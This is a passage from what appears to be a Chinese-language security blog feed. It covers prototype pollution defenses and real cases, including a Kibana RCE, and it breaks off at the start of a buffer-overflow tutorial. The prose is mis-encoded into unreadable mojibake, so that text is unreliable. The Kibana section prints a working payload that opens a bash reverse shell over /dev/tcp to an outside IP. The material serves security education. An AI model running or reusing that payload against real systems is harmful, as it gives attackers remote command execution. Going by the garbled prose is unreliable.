<code>__proto__</code> ä»¥å¤–ï¼Œä¹Ÿè¦æ³¨æ„å¦å¤–ä¸€ç¨®ç¹éæ–¹å¼ï¼Œåƒé€™æ¨£ï¼š</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">var</span> obj <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><br>obj<span class=\"token punctuation\">[</span><span class=\"token string\">'constructor'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string\">'prototype'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">1</span><br><span class=\"token keyword\">var</span> obj2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><br>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>obj2<span class=\"token punctuation\">.</span>a<span class=\"token punctuation\">)</span> <span class=\"token comment\">// 1</span></code></pre>\n<p>ç”¨ <code>constructor.prototype</code> ä¹Ÿå¯ä»¥å»æ±¡æŸ“åŸå‹éˆä¸Šçš„å±¬æ€§ï¼Œæ‰€ä»¥è¦æŠŠé€™å¹¾ç¨®ä¸€èµ·å°æ‰æ‰å®‰å…¨ã€‚</p>\n<p>åƒæ˜¯ <a href=\"https://github.com/lodash/lodash/commit/90e6199a161b6445b01454517b40ef65ebecd2ad\">lodash.merge</a> çš„ prototype pollution å°±æ˜¯ç”¨é€™ç¨®æ–¹å¼ä¿®å¾©çš„ï¼Œç•¶ key æ˜¯ <code>__proto__</code> æˆ–æ˜¯ <code>prototype</code> çš„æ™‚å€™æœƒåšç‰¹æ®Šè™•ç†ã€‚</p>\n<p>ç¬¬äºŒç¨®æ–¹å¼ç°¡å–®æ˜“æ‡‚ï¼Œå°±æ˜¯ä¸è¦ç”¨ object äº†ï¼Œæˆ–æ›´ç²¾ç¢ºåœ°èªªï¼Œã€Œä¸è¦ç”¨æœ‰ prototype çš„ objectã€ã€‚</p>\n<p>æœ‰äº›äººå¯èƒ½çœ‹éä¸€ç¨®å»ºç«‹ç‰©ä»¶çš„æ–¹å¼ï¼Œæ˜¯é€™æ¨£çš„ï¼š<code>Object.create(null)</code>ï¼Œé€™æ¨£å¯ä»¥å»ºç«‹å‡ºä¸€å€‹æ²’æœ‰ <code>__proto__</code> å±¬æ€§çš„ç©ºç‰©ä»¶ï¼Œå°±æ˜¯çœŸçš„ç©ºç‰©ä»¶ï¼Œä»»ä½•çš„ method éƒ½æ²’æœ‰ã€‚ä¹Ÿå› ç‚ºé€™æ¨£ï¼Œæ‰€ä»¥å°±ä¸æœƒæœ‰ prototype pollution çš„å•é¡Œï¼š</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">var</span> obj <span class=\"token operator\">=</span> Object<span class=\"token punctuation\">.</span><span class=\"token function\">create</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span><br>obj<span class=\"token punctuation\">[</span><span class=\"token string\">'__proto__'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">1</span> <span class=\"token comment\">// æ ¹æœ¬æ²’æœ‰ __proto__ é€™å€‹å±¬æ€§</span><br><span class=\"token comment\">// TypeError: Cannot set property 'a' of undefined</span></code></pre>\n<p>åƒæ˜¯é–‹é ­æåˆ°çš„è§£æ query string çš„ libraryï¼Œå…¶å¯¦å·²ç¶“ç”¨äº†é€™ç¨®æ–¹å¼ä¾†é˜²ç¦¦ï¼Œåƒæ˜¯æ¯é€±ä¸‹è¼‰æ¬¡æ•¸é«˜é” 1 åƒè¬æ¬¡çš„ <a href=\"https://www.npmjs.com/package/query-string\">query-string</a>ï¼Œ<a href=\"https://github.com/sindresorhus/query-string#parsestring-options\">æ–‡ä»¶</a>ä¸Šé¢å°±å¯«äº†ï¼š</p>\n<blockquote>\n<p>.parse(string, options?)<br>\nParse a query string into an object. Leading ? or # are ignored, so you can pass location.search or location.hash directly.</p>\n<p>The returned object is created with Object.create(null) and thus does not have a prototype.</p>\n</blockquote>\n<p>å…¶ä»–é‚„æœ‰åƒæ˜¯å»ºè­°ç”¨ <code>Map</code> ä¾†å–ä»£ <code>{}</code>ï¼Œä½†æˆ‘è¦ºå¾—ç›®å‰å¤§å®¶é‚„æ˜¯ç¿’æ…£ç”¨ object å±…å¤šï¼Œæˆ‘è‡ªå·±è¦ºå¾— <code>Object.create(null)</code> æœƒæ¯” Map å¥½ç”¨ä¸€é»ã€‚</p>\n<p>æˆ–æ˜¯ç”¨ <code>Object.freeze(Object.prototype)</code>ï¼ŒæŠŠ prototype å‡çµä½ï¼Œå°±æ²’è¾¦æ³•å»ä¿®æ”¹ï¼š</p>\n<pre class=\"language-js\"><code class=\"language-js\">Object<span class=\"token punctuation\">.</span><span class=\"token function\">freeze</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Object</span><span class=\"token punctuation\">.</span>prototype<span class=\"token punctuation\">)</span><br><span class=\"token keyword\">var</span> obj <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><br>obj<span class=\"token punctuation\">[</span><span class=\"token string\">'__proto__'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">1</span><br><span class=\"token keyword\">var</span> obj2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><br>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>obj2<span class=\"token punctuation\">.</span>a<span class=\"token punctuation\">)</span> <span class=\"token comment\">// undefined</span></code></pre>\n<p>ä½† <code>Object.freeze(Object.prototype)</code> çš„å•é¡Œä¹‹ä¸€æ˜¯å‡è¨­æŸå€‹ç¬¬ä¸‰æ–¹å¥—ä»¶æœ‰å»ä¿®æ”¹ <code>Object.prototype</code>ï¼Œæ¯”å¦‚èªªç‚ºäº†æ–¹ä¾¿ç›´æ¥åœ¨ä¸Šé¢åŠ ä¸€å€‹å±¬æ€§ï¼Œé‚£å°±æœƒæ¯”è¼ƒé›£ debugï¼Œå› ç‚º freeze ä¹‹å¾Œå»ä¿®æ”¹ä¸¦ä¸æœƒé€ æˆéŒ¯èª¤ï¼Œåªæ˜¯ä¸æœƒä¿®æ”¹æˆåŠŸè€Œå·²ã€‚</p>\n<p>æ‰€ä»¥ä½ å¯èƒ½æœƒç™¼ç¾ä½ çš„ç¨‹å¼å› ç‚ºæŸå€‹ç¬¬ä¸‰æ–¹å¥—ä»¶å£æ‰äº†ï¼Œä½†ä½ ä¸çŸ¥é“ç‚ºä»€éº¼ã€‚é‚„æœ‰ä¸€å€‹æˆ‘æƒ³åˆ°çš„å¯èƒ½é¢¨éšªæ˜¯ polyfillï¼Œå‡è¨­æœªä¾†å› ç‚ºç‰ˆæœ¬å•é¡Œéœ€è¦å¹« <code>Object.prototype</code> åŠ ä¸Š polyfillï¼Œå°±æœƒå› ç‚º freeze çš„é—œä¿‚è€Œå¤±æ•ˆã€‚</p>\n<p>è‡³æ–¼ Node.jsï¼Œé‚„å¯ä»¥ä½¿ç”¨ <code>--disable-proto</code> é€™å€‹ option ä¾†æŠŠ <code>Object.prototype.__proto__</code> é—œæ‰ï¼Œè©³æƒ…å¯ä»¥åƒè€ƒ<a href=\"https://nodejs.org/api/cli.html#cli_disable_proto_mode\">å®˜æ–¹æ–‡ä»¶</a></p>\n<p>æˆ–æ˜¯æœªä¾†ä¹Ÿæœ‰å¯èƒ½ä½¿ç”¨ document policy åšè™•ç†ï¼Œå¯ä»¥é—œæ³¨é€™å€‹ issueï¼š <a href=\"https://github.com/WICG/document-policy/issues/33\">Feature proposal: Mitigation for Client-Side Prototype Pollution</a></p>\n<h2 id=\"%E5%AF%A6%E9%9A%9B%E6%A1%88%E4%BE%8B\"><a class=\"direct-link\" href=\"#%E5%AF%A6%E9%9A%9B%E6%A1%88%E4%BE%8B\">#</a> å¯¦éš›æ¡ˆä¾‹</h2>\n<p>æœ€å¾Œæˆ‘å€‘ä¾†çœ‹å…©å€‹ prototype pollution çš„çœŸå¯¦æ¡ˆä¾‹ï¼Œè®“å¤§å®¶æ›´æœ‰æ„Ÿè¦ºä¸€é»ã€‚</p>\n<p>ç¬¬ä¸€å€‹æ¡ˆä¾‹æ˜¯çŸ¥å bug bounty å¹³å° hackerone çš„æ¼æ´ï¼ˆå°ï¼Œå°±æ˜¯ bug bounty å¹³å°æœ¬èº«çš„æ¼æ´ï¼‰ï¼Œå®Œæ•´å ±å‘Šåœ¨é€™è£¡ï¼š<a href=\"https://hackerone.com/reports/986386\">#986386 Reflected XSS on www.hackerone.com via Wistia embed code</a></p>\n<p>åœ¨ç¶²ç«™ä¸Šä»–å€‘ç”¨äº†ä¸€å€‹ç¬¬ä¸‰æ–¹å¥—ä»¶ï¼Œè€Œåœ¨é€™å€‹ç¬¬ä¸‰æ–¹å¥—ä»¶è£¡é¢æœ‰ä¸€æ®µç¨‹å¼ç¢¼é•·é€™æ¨£ï¼š</p>\n<pre class=\"language-js\"><code class=\"language-js\">i<span class=\"token punctuation\">.</span>_initializers<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">initWLog</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">var</span> e<span class=\"token punctuation\">,</span> t<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">,</span> o<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> l<span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> u<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">;</span><br>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>t <span class=\"token operator\">=</span> i<span class=\"token punctuation\">.</span>url<span class=\"token punctuation\">.</span><span class=\"token function\">parse</span><span class=\"token punctuation\">(</span>location<span class=\"token punctuation\">.</span>href<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><br>    document<span class=\"token punctuation\">.</span>referrer <span class=\"token operator\">&amp;&amp;</span> <span class=\"token punctuation\">(</span>u <span class=\"token operator\">=</span> i<span class=\"token punctuation\">.</span>url<span class=\"token punctuation\">.</span><span class=\"token function\">parse</span><span class=\"token punctuation\">(</span>document<span class=\"token punctuation\">.</span>referrer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></code></pre>\n<p>å®ƒæœƒå»è§£æ <code>location.href</code> è·Ÿ <code>document.referrer</code>ï¼Œé€™å…©è€…éƒ½æ˜¯æ”»æ“Šè€…å¯æ§çš„ï¼Œç„¶å¾Œ <code>i.url.parse</code> é€™å€‹ function æœ‰è‘— prototype pollution çš„æ¼æ´ï¼Œæ‰€ä»¥å¯ä»¥æ±¡æŸ“ä»»æ„å±¬æ€§ã€‚</p>\n<p>æ±¡æŸ“ä¹‹å¾Œï¼Œä½œè€…ç™¼ç¾äº†å¦å¤–ä¸€æ®µç¨‹å¼ç¢¼ï¼Œé€™ä¸€æ®µç¨‹å¼ç¢¼è·Ÿæˆ‘å€‘å‰é¢å¯«éçš„ <code>createElement</code> æœ‰ç•°æ›²åŒå·¥ä¹‹å¦™ï¼Œ<code>fromObject</code> æœƒå»éæ­·å±¬æ€§ç„¶å¾Œæ”¾åˆ° DOM ä¸Šï¼š</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>chrome <span class=\"token operator\">=</span> r<span class=\"token punctuation\">.</span>elem<span class=\"token punctuation\">.</span><span class=\"token function\">fromObject</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span><br>    id<span class=\"token operator\">:</span> r<span class=\"token punctuation\">.</span><span class=\"token function\">seqId</span><span class=\"token punctuation\">(</span><span class=\"token string\">'wistia_chrome_'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><br>    <span class=\"token keyword\">class</span><span class=\"token operator\">:</span> <span class=\"token string\">'w-chrome'</span><span class=\"token punctuation\">,</span><br>    style<span class=\"token operator\">:</span> r<span class=\"token punctuation\">.</span>generate<span class=\"token punctuation\">.</span><span class=\"token function\">relativeBlockCss</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><br>    tabindex<span class=\"token operator\">:</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><br><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span></code></pre>\n<p>æ‰€ä»¥åªè¦æ±¡æŸ“ <code>innerHTML</code>ï¼Œå°±å¯ä»¥åˆ©ç”¨é€™å€‹ script gadget è£½é€ å‡ºä¸€å€‹ XSS æ¼æ´ã€‚å¯¦éš›çš„æ”»æ“Šæ–¹å¼å°±æ˜¯æ§‹é€ å‡ºä¸€å€‹èƒ½å¤ è§¸ç™¼ prototype pollution + XSS çš„ç¶²å€ï¼Œåªè¦æŠŠç¶²å€å‚³çµ¦åˆ¥äººï¼Œé»é–‹ä»¥å¾Œå°±æœƒç›´æ¥é­å—åˆ°æ”»æ“Šã€‚</p>\n<p>é€™æ”»æ“Šå¾ŒåŠæ®µé‚„æœ‰ç¹é CSP çš„æ®µè½ï¼Œç”¨çš„æ˜¯ä¹‹å‰æˆ‘åœ¨ <a href=\"https://tech-blog.cymetrics.io/posts/huli/front-end-supply-chain-attack-cdnjs/\">å¾ cdnjs çš„æ¼æ´ä¾†çœ‹å‰ç«¯çš„ä¾›æ‡‰éˆæ”»æ“Šèˆ‡é˜²ç¦¦</a>ä¸­æœ‰æéçš„æŠ€å·§ã€‚</p>\n<p>å¦ä¸€å€‹æ¡ˆä¾‹æ˜¯ Kibana çš„æ¼æ´ï¼ŒåŸå§‹æ–‡ç« åœ¨é€™è£¡ï¼š<a href=\"https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/\">Exploiting prototype pollution â€“ RCE in Kibana (CVE-2019-7609)</a>ï¼Œå®˜æ–¹å°æ–¼é€™å€‹æ¼æ´çš„æè¿°æ˜¯é€™æ¨£çš„ï¼š</p>\n<blockquote>\n<p>An attacker with access to the Timelion application could send a request that will attempt to execute javascript code. This could possibly lead to an attacker executing arbitrary commands with permissions of the Kibana process on the host system.</p>\n</blockquote>\n<p>åœ¨ Kibana è£¡é¢æœ‰ä¸€å€‹ Timelion çš„åŠŸèƒ½ï¼Œå¯ä»¥è‡ªå·±è¼¸å…¥èªæ³•ä¸¦ä¸”ç•«æˆåœ–è¡¨ï¼Œè€Œä¸‹é¢é€™ä¸€æ®µèªæ³•å¯ä»¥æ±¡æŸ“ prototypeï¼š</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token punctuation\">.</span>es<span class=\"token punctuation\">.</span><span class=\"token function\">props</span><span class=\"token punctuation\">(</span>label<span class=\"token punctuation\">.</span>__proto__<span class=\"token punctuation\">.</span>x<span class=\"token operator\">=</span><span class=\"token string\">'ABC'</span><span class=\"token punctuation\">)</span></code></pre>\n<p>æ±¡æŸ“ prototype åªæ˜¯ç¬¬ä¸€æ­¥ï¼Œä¸‹ä¸€æ­¥æ˜¯è¦æ‰¾å‡º script gadgetï¼Œkibana ä¸­çš„å…¶ä¸­ä¸€æ®µç¨‹å¼ç¢¼é•·é€™æ¨£å­ï¼š</p>\n<pre class=\"language-js\"><code class=\"language-js\">  <span class=\"token keyword\">var</span> env <span class=\"token operator\">=</span> options<span class=\"token punctuation\">.</span>env <span class=\"token operator\">||</span> process<span class=\"token punctuation\">.</span>env<span class=\"token punctuation\">;</span><br>  <span class=\"token keyword\">var</span> envPairs <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><br><br>  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">var</span> key <span class=\"token keyword\">in</span> env<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">const</span> value <span class=\"token operator\">=</span> env<span class=\"token punctuation\">[</span>key<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><br>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>value <span class=\"token operator\">!==</span> <span class=\"token keyword\">undefined</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>      envPairs<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span><span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>key<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\">=</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>value<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br>  <span class=\"token punctuation\">}</span></code></pre>\n<p>é€™ä¸€æ®µæœƒä¾†æ‹¿æ§‹é€ ç’°å¢ƒè®Šæ•¸ï¼Œè€Œé€™å€‹ç’°å¢ƒè®Šæ•¸æœƒç”¨ä¾†è·‘æ–°çš„ node processï¼Œä¾‹å¦‚èªª envPairs å¦‚æœæ˜¯ <code>a=1</code> çš„è©±ï¼Œæ‡‰è©²å°±æœƒè·‘ <code>a=1 node xxx.js</code> é€™å€‹æŒ‡ä»¤ã€‚</p>\n<p>æ—¢ç„¶æ˜¯è·‘ node.jsï¼Œæˆ‘å€‘å¯ä»¥åˆ©ç”¨ <code>NODE_OPTIONS</code> é€™å€‹ç’°å¢ƒè®Šæ•¸ä¾†å·å·å¼•å…¥æª”æ¡ˆï¼š</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token comment\">// a.js</span><br>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">'a.js'</span><span class=\"token punctuation\">)</span><br><br><span class=\"token comment\">// b.js</span><br>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">'b.js'</span><span class=\"token punctuation\">)</span><br><br><span class=\"token comment\">// è·‘é€™å€‹æŒ‡ä»¤ï¼Œç”¨ç’°å¢ƒè®Šæ•¸å¼•å…¥ a.js</span><br><span class=\"token constant\">NODE_OPTIONS</span><span class=\"token operator\">=</span><span class=\"token string\">\"--require ./a.js\"</span> node b<span class=\"token punctuation\">.</span>js<br><br><span class=\"token comment\">// è¼¸å‡º</span><br>a<span class=\"token punctuation\">.</span>js<br>b<span class=\"token punctuation\">.</span>js</code></pre>\n<p>æ‰€ä»¥ï¼Œå¦‚æœæˆ‘å€‘å¯ä»¥ä¸Šå‚³ä¸€å€‹ js æª”æ¡ˆï¼Œå°±å¯ä»¥æ­é… prototype pollution å»åŸ·è¡Œé€™å€‹æª”æ¡ˆäº†ã€‚è½èµ·ä¾†æœ‰é»éº»ç…©ï¼Œæœ‰å…¶ä»–æ–¹æ³•å—ï¼Ÿ</p>\n<p>æœ‰ï¼æœ‰ä¸€å€‹æ»¿å¸¸ç”¨çš„æŠ€å·§æ˜¯æœ‰äº›æª”æ¡ˆçš„å…§å®¹å…¶å¯¦æ˜¯å¯æ§çš„ï¼Œä¾‹å¦‚èªª PHP ä¸­çš„ session å…§å®¹å°±æœ‰æ©Ÿæœƒæ§åˆ¶ï¼Œå¯åƒè€ƒé€™ä¸€ç¯‡ï¼š<a href=\"https://kb.hitcon.org/post/165429468072/%E9%80%8F%E9%81%8E-lfi-%E5%BC%95%E5%85%A5-php-session-%E6%AA%94%E6%A1%88%E8%A7%B8%E7%99%BC-rce\">é€é LFI å¼•å…¥ PHP session æª”æ¡ˆè§¸ç™¼ RCE</a>ï¼Œè€Œå¦ä¸€å€‹ Linux ç³»çµ±ä¸­çš„æª”æ¡ˆ <code>/proc/self/environ</code> å‰‡æ˜¯æœƒæœ‰ç¾åœ¨çš„ process çš„æ‰€æœ‰ç’°å¢ƒè®Šæ•¸ã€‚</p>\n<p>å¦‚æœæˆ‘å€‘å»ºç«‹ä¸€å€‹ç’°å¢ƒè®Šæ•¸å«åš <code>A=console.log(123)//</code>ï¼Œ<code>/proc/self/environ</code> çš„å…§å®¹å°±æœƒè®Šç‚ºï¼š</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token constant\">A</span><span class=\"token operator\">=</span>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token number\">123</span><span class=\"token punctuation\">)</span><span class=\"token comment\">//YARN_VERSION=1.1PWD=/userLANG=en_US.UTF-8....</span></code></pre>\n<p>å°±è®Šæˆäº†åˆæ³•çš„ JS ç¨‹å¼ç¢¼ï¼</p>\n<p>æ–¼æ˜¯å°±å¯ä»¥åˆ©ç”¨é€™æ¨£çš„æ–¹å¼å»åŸ·è¡Œå®ƒï¼š</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token constant\">NODE_OPTIONS</span><span class=\"token operator\">=</span><span class=\"token string\">\"--require /proc/self/environ\"</span> <span class=\"token constant\">A</span><span class=\"token operator\">=</span><span class=\"token string\">'console.log(1)//'</span> node b<span class=\"token punctuation\">.</span>js</code></pre>\n<p>ä½œè€…æœ€å¾Œçµ¦å‡ºçš„ code é•·é€™æ¨£ï¼š</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token punctuation\">.</span><span class=\"token function\">es</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">props</span><span class=\"token punctuation\">(</span>label<span class=\"token punctuation\">.</span>__proto__<span class=\"token punctuation\">.</span>env<span class=\"token punctuation\">.</span><span class=\"token constant\">AAAA</span><span class=\"token operator\">=</span><span class=\"token string\">'require(\"child_process\").exec(\"bash -i >&amp; /dev/tcp/192.168.0.136/12345 0>&amp;1\");process.exit()//'</span><span class=\"token punctuation\">)</span><br><span class=\"token punctuation\">.</span><span class=\"token function\">props</span><span class=\"token punctuation\">(</span>label<span class=\"token punctuation\">.</span>__proto__<span class=\"token punctuation\">.</span>env<span class=\"token punctuation\">.</span><span class=\"token constant\">NODE_OPTIONS</span><span class=\"token operator\">=</span><span class=\"token string\">'--require /proc/self/environ'</span><span class=\"token punctuation\">)</span></code></pre>\n<p>æ±¡æŸ“äº†å…©å€‹ä¸åŒçš„å±¬æ€§ï¼Œå‰µé€ äº†å…©å€‹ç’°å¢ƒè®Šæ•¸ï¼Œä¸€å€‹ç”¨ä¾†æŠŠ <code>/proc/self/environ</code> è®Šæˆåˆæ³•çš„ JS ä¸¦ä¸”åŒ…å«äº†è¦åŸ·è¡Œçš„ç¨‹å¼ç¢¼ï¼Œå¦ä¸€å€‹ <code>NODE_OPTIONS</code> å‰‡é€é <code>--require</code> å»å¼•å…¥ <code>/proc/self/environ</code>ï¼Œæœ€å¾Œå°±ä¸²æˆäº†å¯ä»¥åŸ·è¡Œä»»æ„ç¨‹å¼ç¢¼çš„ RCE æ¼æ´ï¼</p>\n<h2 id=\"%E7%B5%90%E8%AA%9E\"><a class=\"direct-link\" href=\"#%E7%B5%90%E8%AA%9E\">#</a> çµèª</h2>\n<p>æˆ‘è‡ªå·±åœ¨æ¥è§¸è³‡å®‰ä»¥å‰ï¼Œæ˜¯æ²’æœ‰è½é prototype pollution çš„ã€‚</p>\n<p>å› æ­¤ç•¶æˆ‘ç¬¬ä¸€æ¬¡æ¥è§¸åˆ° prototype pollution é€™å€‹æ¼æ´çš„æ™‚å€™ï¼Œæˆ‘è¦ºå¾—æœ‰äº›é©šè¨ã€‚æˆ‘é©šè¨çš„é»åœ¨æ–¼ï¼Œç‚ºä»€éº¼æˆ‘å¾ä¾†æ²’è½éé€™å€‹ï¼Ÿæ¯”èµ·å‰ç«¯å¸¸è¦‹çš„æ¼æ´åƒæ˜¯ XSS æˆ–æ˜¯ CSRF ç­‰ç­‰ï¼Œprototype pollution çš„çŸ¥ååº¦ä¼¼ä¹ä½äº†è¨±å¤šã€‚</p>\n<p>æœ‰äº›äººç¬¬ä¸€æ¬¡çœ‹åˆ°é€™åè©å¯èƒ½æ˜¯å› ç‚ºæŸå€‹ NPM çš„ package æœ‰é€™å€‹æ¼æ´ï¼Œå‡ç´šç‰ˆæœ¬ä»¥å¾Œå°±ä¿®æ‰äº†ï¼Œä½†å¯èƒ½æ²’æœ‰å»ç†è§£é€™å€‹æ¼æ´çš„æˆå› ä»¥åŠå¯èƒ½çš„å½±éŸ¿ã€‚</p>\n<p>æˆ‘è‡ªå·±å…¶å¯¦æ»¿æ„›é€™å€‹æ¼æ´çš„ï¼Œç¬¬ä¸€æ˜¯æˆ‘è¦ºå¾—æˆå› å¾ˆæœ‰è¶£ï¼Œç¬¬äºŒæ˜¯æˆ‘è¦ºå¾—å°‹æ‰¾ script gadget ä¹Ÿå¾ˆæœ‰è¶£ã€‚ç¸½ä¹‹å‘¢ï¼Œå¸Œæœ›èƒ½è—‰ç”±é€™ç¯‡æ–‡ç« ï¼Œè®“æ›´å¤šå‰ç«¯å·¥ç¨‹å¸«èªè­˜åˆ°é€™å€‹æ¼æ´ï¼Œä¸¦ä¸”çŸ¥é“å®ƒçš„åŸç†ä»¥åŠé˜²ç¦¦æ–¹å¼ã€‚</p>\n<p>æœ€å¾Œæ¨è–¦å¤§å®¶ä¸€ç¯‡è¶…è®šçš„æ–‡ç« ï¼Œé€éè‡ªå‹•åŒ–çš„æ–¹å¼å»æª¢æ¸¬ prototype pollution æ¼æ´ï¼Œä¸¦ä¸”æ‰¾å‡ºç™¼ç”Ÿå•é¡Œçš„åœ°æ–¹ï¼Œæˆ‘è¦ºå¾—æŠŠ prototype pollution åˆæå‡åˆ°äº†å¦ä¸€å€‹å¢ƒç•Œï¼š<a href=\"https://blog.s1r1us.ninja/research/PP\">A tale of making internet pollution free - Exploiting Client-Side Prototype Pollution in the wild</a></p>\n",
      "date_published": "2021-09-29T08:00:00+08:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/crystal/pwn-intro/",
      "url": "https://tech-blog.cymetrics.io/posts/crystal/pwn-intro/",
      "title": "PWN å…¥é–€ - buffer overflow æ˜¯ä»€éº¼ï¼Ÿ",
      "content_html": "<!-- summary -->\n<p>ä½ å¯èƒ½åœ¨å¾ˆå¤š CVE è£¡éƒ½çœ‹é buffer overflow é€™å€‹åè©ï¼Œä½†ä½ çŸ¥é“é€™å€‹å¼±é»æ˜¯å¦‚ä½•å¼•ç™¼ RCE é€™éº¼åš´é‡çš„å•é¡Œçš„å—ï¼Ÿé€™æ¬¡è®“æˆ‘å€‘ä¾†é€éå¹¾å€‹ç°¡å–®å°é¡Œç›®çœ‹çœ‹ buffer overflow å¦‚ä½•ç™¼ç”Ÿï¼Œåˆè©²å¦‚ä½• exploitã€‚</p>\n<!-- summary -->\n<p>åœ¨é–‹å§‹ä¹‹å‰ï¼Œè«‹å…ˆé–±è®€ Reverse 101 çš„åŸºç¤ç¯‡ï¼š<a href=\"https://tech-blog.cymetrics.io/posts/crystal/reverse-01\"><strong>Reverse Engineering 101â€Šâ€”â€ŠPart 1</strong></a>ï¼Œå­¸ç¿’ pwn çš„æ™‚å€™ï¼Œäº†è§£è¨˜æ†¶é«”åˆ†é…èˆ‡ç¨‹å¼çš„é‹ä½œæ–¹å¼æ˜¯å¾ˆé‡è¦çš„ã€‚</p>\n<h2 id=\"what-is-buffer-overflow%3F\"><a class=\"direct-link\" href=\"#what-is-buffer-overflow%3F\">#</a> What is buffer overflow?</h2>\n<p>è®“æˆ‘å€‘å›é¡§ä¸€ä¸‹å‡½æ•¸çš„å‘¼å«èˆ‡åŸ·è¡Œæ˜¯å¦‚ä½•é‹ä½œçš„ã€‚åœ¨ 64 bit çš„ Unix ç³»çµ±ä¸­ï¼Œåƒæ•¸æœƒä»¥æš«å­˜å™¨å‚³éï¼ˆé€šå¸¸å‰å…­å€‹ç‚º <code>rdi</code> <code>rsi</code> <code>rdx</code> <code>rcx</code> <code>r8</code> <code>r9</code>ï¼‰ï¼Œè€Œæ¯ä¸€å€‹å‡½æ•¸å…§éƒ¨æœƒç”¨åˆ°çš„è®Šæ•¸ä»¥åŠçµæŸå¾Œè¦è¿”å›ç¹¼çºŒåŸ·è¡Œçš„æŒ‡ä»¤ä½ç½®ç­‰è³‡æ–™ï¼Œæœƒä»¥ä¸€å€‹ stack frame çš„çµæ§‹å±¤å±¤å †ç–Šï¼Œä¸¦ç”¨ calling convention ç®¡ç† stack frame çš„å‰µå»ºèˆ‡éŠ·æ¯€ã€‚</p>\n<p>å…ˆå‰æˆ‘å€‘çœ‹åˆ°çš„ stack frame åªæ˜¯ä¸€å€‹ç²‰ç´…è‰²çš„å€å¡Šï¼Œä½†ç¾åœ¨æˆ‘å€‘è¦ä¾†æ›´ä»”ç´°çš„æª¢è¦–é€™å¡Šè¨˜æ†¶é«”è£¡åˆ°åº•è£äº†ä»€éº¼ã€‚</p>\n<p>ä¸‹é¢é€™é‚Šæ˜¯ä¸€æ®µç°¡å–®çš„ C 